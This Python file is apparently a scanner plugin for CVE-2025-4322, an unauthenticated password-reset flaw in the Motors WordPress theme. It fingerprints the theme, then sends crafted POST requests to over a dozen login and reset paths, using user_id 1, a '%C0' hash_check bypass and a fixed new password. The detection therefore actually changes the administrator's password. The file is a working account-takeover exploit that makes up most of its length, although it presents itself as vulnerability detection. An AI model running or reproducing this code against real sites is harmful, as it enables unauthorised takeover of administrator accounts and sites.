"""Agent implementation for detecting CVE-2025-4322."""

import datetime
import re
import logging
from requests import exceptions as requests_exceptions
from urllib.parse import urljoin

from agent import definitions
from agent import exploits_registry

# --- CVE-2025-4322 Specific Constants ---
VULNERABILITY_TITLE = "Motors Theme <= 5.6.67 - Unauthenticated Privilege Escalation via Password Update/Account Takeover"
VULNERABILITY_REFERENCE = "CVE-2025-4322"
VULNERABILITY_DESCRIPTION = (
    "The Motors WordPress theme contains a critical authentication flaw in its password reset functionality. "
    "It provides a front-end password update mechanism via endpoints, but fails to properly validate user identity or "
    "authorization. Unauthenticated attackers can send crafted HTTP POST requests supplying a user_id, an "
    "arbitrary hash_check, and a new password (stm_new_password) to reset any userâ€™s password, including "
    "administrators, allowing full site takeover."
)
RECOMMENDATION = (
    "Update the Motors theme to a patched version (greater than 5.6.67). "
    "If not in use, disable or restrict access to front-end endpoints like /loginregister/. "
    "Implement strict identity validation for password resets. "
    "Use WAF for virtual patching."
)
RISK_RATING = "CRITICAL"
MOTORS_INDICATOR = "/wp-content/themes/motors/style.css"

TARGET_USER_ID_TO_ATTACK = "1"
NEW_PASSWORD_TO_SET = "ExploitedP@sswOrd123!"
HASH_CHECK_BYPASS_VALUE = "%C0"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=10)

VULNERABLE_ENDPOINT_PATHS = [
    "/loginregister/",
    "/login-register",
    "/login/",
    "/register/",
    "/my-account/",
    "/my-account/lost-password/",
    "/account/",
    "/signin/",
    "/sign-in/",
    "/auth/",
    "/user/login/",
    "/user/signin/",
    "/forgot-password/",
    "/reset-password/",
]

EXPLICIT_SUCCESS_MESSAGE_PATTERNS = [
    r"Password changed",  # From: <div class="stm-validation-message">Password changed</div>
    # Still Looking for other indicators if they exist.
]


logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


def _check_homepage_for_motors_form_indicator(
    session: definitions.HttpSession, base_url: str
) -> bool:
    """Checks the homepage (base_url) for the Motors login form indicator."""
    homepage_url = urljoin(base_url, MOTORS_INDICATOR)
    try:
        logger.debug(
            "Checking for Motors form indicator '%s' at homepage: %s",
            MOTORS_INDICATOR,
            homepage_url,
        )
        response = session.get(
            homepage_url, timeout=DEFAULT_TIMEOUT.seconds, allow_redirects=True
        )
        if (
            response.status_code == 200
            and re.search("Theme Name:\s*Motors", response.text) is not None
        ):
            logger.info(
                "Found Motors form indicator '%s' at homepage %s",
                MOTORS_INDICATOR,
                homepage_url,
            )
            return True
        logger.debug(
            "Motors form indicator '%s' not found or unexpected status code (%s) at homepage %s",
            MOTORS_INDICATOR,
            response.status_code,
            homepage_url,
        )
    except requests_exceptions.RequestException as e:
        logger.warning(
            "Request failed while checking for Motors form indicator at homepage %s: %s",
            homepage_url,
            e,
        )
    return False


def _attempt_password_reset(
    session: definitions.HttpSession,
    base_url: str,
    endpoint_path: str,
    user_id: str,
    new_password: str,
    hash_check: str,
) -> bool:
    """
    Attempts the unauthenticated password reset on a specific endpoint.
    Returns True ONLY if an explicit, known success message is found in a 200 OK response.
    """
    exploit_url_base = urljoin(base_url, endpoint_path)
    params = {"user_id": user_id, "hash_check": hash_check}
    data = {"stm_new_password": new_password}
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        log_url_params = "&".join(["%s=%s" % (k, v) for k, v in params.items()])
        log_url = "%s?%s" % (exploit_url_base, log_url_params)
        logger.info("Attempting password reset for user_id %s at %s", user_id, log_url)

        response = session.post(
            exploit_url_base,
            params=params,
            data=data,
            headers=headers,
            timeout=DEFAULT_TIMEOUT.seconds,
            allow_redirects=True,
        )

        logger.debug(
            "Password reset attempt to %s response status: %s",
            endpoint_path,
            response.status_code,
        )

        if response.status_code == 200:
            for pattern in EXPLICIT_SUCCESS_MESSAGE_PATTERNS:
                if re.search(pattern, response.text, re.IGNORECASE) is not None:
                    logger.info(
                        "Found explicit success message matching pattern '%s' in response from %s.",
                        pattern,
                        endpoint_path,
                    )
                    return True

            logger.warning(
                "Password reset POST to %s returned 200 OK, but no recognized explicit success message was found. "
                "This could be a silent success or a non-vulnerable page reload. "
                "To minimize false positives, this is NOT treated as a confirmed success by this script.",
                endpoint_path,
            )
        else:
            logger.warning(
                "Password reset attempt to %s returned non-200 status: %s",
                endpoint_path,
                response.status_code,
            )

        return False

    except requests_exceptions.RequestException as e:
        logger.error(
            "HTTP request failed during password reset attempt to %s: %s",
            endpoint_path,
            e,
        )
        return False


@exploits_registry.register
class MotorsPasswordResetExploit(definitions.Exploit):
    """CVE-2025-4322: Motors Theme Unauthenticated Password Reset."""

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
        recommendation=RECOMMENDATION,
        cve_ids=["CVE-2025-4322"],
    )

    def accept(self, target: definitions.Target) -> bool:
        """
        Checks if the target's homepage shows indicators of using the Motors theme's login/register functionality.
        """
        logger.info(
            "Accept? Checking target homepage: %s for Motors theme indicator '%s'.",
            target.origin,
            MOTORS_INDICATOR,
        )

        if (
            _check_homepage_for_motors_form_indicator(self.session, target.origin)
            is True
        ):
            logger.info(
                "Motors theme indicator '%s' found on homepage '%s'. Accepting target.",
                MOTORS_INDICATOR,
                target.origin,
            )
            return True

        logger.info(
            "Motors theme indicator '%s' not found on homepage. Rejecting target.",
            MOTORS_INDICATOR,
        )
        return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Attempts to exploit the unauthenticated password reset vulnerability on accepted targets.
        """
        logger.info(
            "Check: Attempting exploit for %s on %s",
            VULNERABILITY_REFERENCE,
            target.origin,
        )
        vulnerabilities: list[definitions.Vulnerability] = []
        exploit_succeeded_on_any_path = False

        for endpoint_path in VULNERABLE_ENDPOINT_PATHS:
            logger.info(
                "Trying exploit on endpoint: %s%s", target.origin, endpoint_path
            )
            if (
                _attempt_password_reset(
                    self.session,
                    target.origin,
                    endpoint_path,
                    TARGET_USER_ID_TO_ATTACK,
                    NEW_PASSWORD_TO_SET,
                    HASH_CHECK_BYPASS_VALUE,
                )
                is True
            ):
                exploit_succeeded_on_any_path = True
                logger.critical(
                    "Exploit attempt on %s%s for user_id %s appears to be SUCCESSFUL based on explicit success message.",
                    target.origin,
                    endpoint_path,
                    TARGET_USER_ID_TO_ATTACK,
                )
                break
            else:
                logger.info(
                    "Exploit attempt on %s%s did not confirm success with an explicit message.",
                    target.origin,
                    endpoint_path,
                )

        if exploit_succeeded_on_any_path is True:
            vulnerability = self.create_vulnerability(
                target=target,
            )
            vulnerabilities.append(vulnerability)
        else:
            logger.info(
                "Exploit attempt for %s on %s did not confirm vulnerability on any tested paths with an explicit success message.",
                VULNERABILITY_REFERENCE,
                target.origin,
            )

        return vulnerabilities
